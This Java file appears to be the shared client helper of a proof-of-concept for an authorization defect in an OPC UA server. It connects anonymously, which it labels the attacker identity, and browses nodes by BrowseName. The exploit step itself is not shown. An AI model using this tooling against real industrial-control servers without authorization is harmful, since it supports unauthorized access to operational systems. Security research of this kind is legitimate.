/*
 * the RoleMapper-drop defect PoC: shared client helper (connect anonymously, resolve a BrowseName path).
 */
package poc;

import org.eclipse.milo.opcua.sdk.client.OpcUaClient;
import org.eclipse.milo.opcua.sdk.client.identity.AnonymousProvider;
import org.eclipse.milo.opcua.stack.core.NodeIds;
import org.eclipse.milo.opcua.stack.core.types.builtin.LocalizedText;
import org.eclipse.milo.opcua.stack.core.types.builtin.NodeId;
import org.eclipse.milo.opcua.stack.core.types.builtin.unsigned.UInteger;
import org.eclipse.milo.opcua.stack.core.types.enumerated.BrowseDirection;
import org.eclipse.milo.opcua.stack.core.types.structured.BrowseDescription;
import org.eclipse.milo.opcua.stack.core.types.structured.BrowseResult;
import org.eclipse.milo.opcua.stack.core.types.structured.ReferenceDescription;

public class ClientUtil {

  private ClientUtil() {}

  /** Connect with NO credentials at all -- the anonymous, zero-privilege attacker identity. */
  public static OpcUaClient connectAnonymous(String endpointUrl, String appName) throws Exception {
    OpcUaClient client =
        OpcUaClient.create(
            endpointUrl,
            endpoints -> endpoints.stream().findFirst(),
            transportConfigBuilder -> {},
            clientConfigBuilder ->
                clientConfigBuilder
                    .setApplicationName(LocalizedText.english(appName))
                    .setApplicationUri("urn:rolemapper:" + appName)
                    .setIdentityProvider(new AnonymousProvider()));
    client.connect();
    return client;
  }

  /** Browse from {@code parentId} for a direct child whose BrowseName matches {@code name}. */
  public static NodeId findChildByBrowseName(OpcUaClient client, NodeId parentId, String name)
      throws Exception {
    BrowseDescription bd =
        new BrowseDescription(
            parentId,
            BrowseDirection.Forward,
            NodeIds.HierarchicalReferences,
            true,
            UInteger.valueOf(0),
            UInteger.valueOf(0x3F));

    BrowseResult browseResult = client.browse(bd);
    ReferenceDescription[] refs = browseResult.getReferences();
    if (refs == null) {
      return null;
    }

    for (ReferenceDescription rd : refs) {
      if (rd.getBrowseName() != null && name.equals(rd.getBrowseName().getName())) {
        return rd.getNodeId().toNodeId(client.getNamespaceTable()).orElse(null);
      }
    }
    return null;
  }
}
